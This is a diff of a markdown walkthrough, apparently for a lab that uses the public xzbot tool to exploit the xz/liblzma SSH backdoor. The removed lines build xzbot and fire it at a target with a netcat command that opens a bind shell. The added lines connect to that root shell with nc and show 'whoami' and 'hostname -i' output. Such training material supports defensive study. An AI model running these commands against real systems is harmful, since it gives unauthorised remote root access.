@@ -127,40 +127,18 @@ Usage of /xzbot/tmp/xzbot:
 ### 4: Profit
 Connect to the shell you spawned. Note the use of the xzwhy_endpoint variable:
 ```
-docker run -it --rm golang:latest /bin/bash -c "mkdir -p /xzbot && pushd /xzbot/ && git clone https://github.com/amlweems/xzbot.git && ls -laF && pushd ./xzbot/ && go build -o /xzbot/tmp/; popd && /xzbot/tmp/xzbot -h && /xzbot/tmp/xzbot -addr $xzwhy_endpoint:2222 -cmd 'nc -lnvp 1234 -e /bin/bash'"
+nc $xzwhy_endpoint 1234
 ```
 
-It isn't immediately obvious, but the command above should now be connected to the remote bind shell. You can test this by running various commands:
+It isn't immediately obvious, but the command above connects to a bind shell as root. You can test this by running various commands:
 ```
 whoami
 root
 ```
 
 ```
-ls -liart
-total 0
-29377113 drwxr-xr-x   2 root root   6 Jun 11  2023 home
-26259491 drwxr-xr-x   2 root root   6 Jun 11  2023 boot
-24205734 drwxr-xr-x   1 root root  41 Mar 11 00:00 var
-40912790 drwxr-xr-x   1 root root  30 Mar 11 00:00 usr
-37758063 drwxr-xr-x   2 root root   6 Mar 11 00:00 srv
-15748188 lrwxrwxrwx   1 root root   8 Mar 11 00:00 sbin -> usr/sbin
-32522820 drwxr-xr-x   2 root root   6 Mar 11 00:00 opt
-31465607 drwxr-xr-x   2 root root   6 Mar 11 00:00 mnt
-30427284 drwxr-xr-x   2 root root   6 Mar 11 00:00 media
-15748187 lrwxrwxrwx   1 root root   9 Mar 11 00:00 lib64 -> usr/lib64
-15748186 lrwxrwxrwx   1 root root   7 Mar 11 00:00 lib -> usr/lib
-15748184 lrwxrwxrwx   1 root root   7 Mar 11 00:00 bin -> usr/bin
-12633381 drwx------   1 root root  18 Mar 30 12:22 root
-       1 dr-xr-xr-x  13 root root   0 Apr 17 21:44 sys
-34652905 drwxr-xr-x   1 root root  61 Apr 17 22:26 ..
-34652905 drwxr-xr-x   1 root root  61 Apr 17 22:26 .
-       1 dr-xr-xr-x 166 root root   0 Apr 17 22:26 proc
- 3413214 drwxr-xr-x   1 root root  39 Apr 17 22:26 etc
-       1 drwxr-xr-x   5 root root 360 Apr 17 22:26 dev
-39855738 drwxrwxrwt   1 root root   6 Apr 17 22:26 tmp
-14845582 drwxr-xr-x   1 root root  37 Apr 17 22:26 run
-
+hostname -i
+10.0.128.62
 ```
 
 
